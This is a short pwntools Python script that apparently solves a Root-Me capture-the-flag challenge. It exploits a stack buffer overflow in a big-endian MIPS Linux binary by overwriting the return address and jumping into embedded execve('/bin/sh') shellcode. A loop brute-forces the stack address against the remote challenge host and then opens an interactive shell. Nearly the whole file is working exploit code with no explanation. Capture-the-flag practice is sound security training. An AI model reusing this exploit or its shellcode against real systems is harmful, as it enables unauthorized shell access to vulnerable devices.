from pwn import *

context(arch="mips",endian="big",os="linux")

elf = ELF("./ch65")

shellcode = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c/bin/sh\x00"

#p = gdb.debug(elf.path,'''
#    break __start
#''')
#p = process(elf.path)
#stack_addr = 0x7fffec58

stack_addr = 0x7ffffe20
while True:
    log.info("stack_addr = " + hex(stack_addr))
    p = remote("challenge03.root-me.org",56565)
    print(p.recvuntil(": "))
    
    buf = b'A' * 0x14 
    buf += p32(stack_addr + 0x14 + 4)
    buf += shellcode
    print(len(buf))
    p.send(buf)
    print(p.recvuntil("Hello "))
    stack_addr += 52
    p.interactive()
